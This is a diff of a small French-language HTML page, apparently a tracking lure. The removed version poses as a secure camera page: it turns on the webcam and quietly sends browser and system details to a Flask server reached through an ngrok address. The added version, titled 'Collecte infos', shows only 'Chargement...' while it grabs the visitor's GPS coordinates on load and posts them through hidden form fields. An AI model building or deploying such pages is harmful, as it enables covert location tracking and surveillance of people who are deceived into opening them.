@@ -1,93 +1,40 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Caméra Sécurisée</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      background: #121212;
-      color: #ffffff;
-      font-family: 'Segoe UI', sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      height: 100vh;
-      box-sizing: border-box;
-    }
-
-    h1 {
-      margin-bottom: 10px;
-      font-size: 28px;
-      color: #00bcd4;
-    }
-
-    p {
-      margin-bottom: 20px;
-      color: #bbb;
-    }
-
-    video {
-      border: 4px solid #00bcd4;
-      border-radius: 12px;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: 0 0 12px rgba(0, 188, 212, 0.5);
-    }
-
-    footer {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #666;
-    }
-  </style>
-</head>
-<body>
-  <h1>🎥 Accès Caméra Sécurisé</h1>
-  <p>Votre caméra est en cours d’activation.</p>
-  <video id="video" autoplay playsinline></video>
-  <footer>Connexion en cours...</footer>
-
+  <title>Collecte infos</title>
   <script>
-    // Remplace ce lien par ton adresse ngrok ou Render (ex: https://xxx.ngrok.io/send_info)
-    const FLASK_URL = "https://TON_ADRESSE/send_info";
+    function envoyerInfos() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
 
-    // 🎥 Activation et affichage de la caméra
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        const video = document.getElementById("video");
-        video.srcObject = stream;
-      })
-      .catch(error => {
-        console.error("Erreur caméra :", error);
-      });
+          const form = document.createElement('form');
+          form.method = 'POST';
+          form.action = '/collect';
 
-    // 📡 Collecte des infos système
-    const infos = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      resolution: `${screen.width}x${screen.height}`,
-      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      date: new Date().toISOString()
-    };
+          const latField = document.createElement('input');
+          latField.type = 'hidden';
+          latField.name = 'latitude';
+          latField.value = latitude;
+          form.appendChild(latField);
 
-    // 📤 Envoi en arrière-plan au serveur Flask
-    fetch(FLASK_URL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(infos)
-    })
-    .then(() => {
-      console.log("✅ Données envoyées au serveur.");
-    })
-    .catch(err => {
-      console.error("❌ Erreur d'envoi :", err);
-    });
+          const longField = document.createElement('input');
+          longField.type = 'hidden';
+          longField.name = 'longitude';
+          longField.value = longitude;
+          form.appendChild(longField);
+
+          document.body.appendChild(form);
+          form.submit();
+        });
+      } else {
+        alert("La géolocalisation est désactivée !");
+      }
+    }
   </script>
+</head>
+<body onload="envoyerInfos()">
+  <h1>Chargement...</h1>
 </body>
 </html>
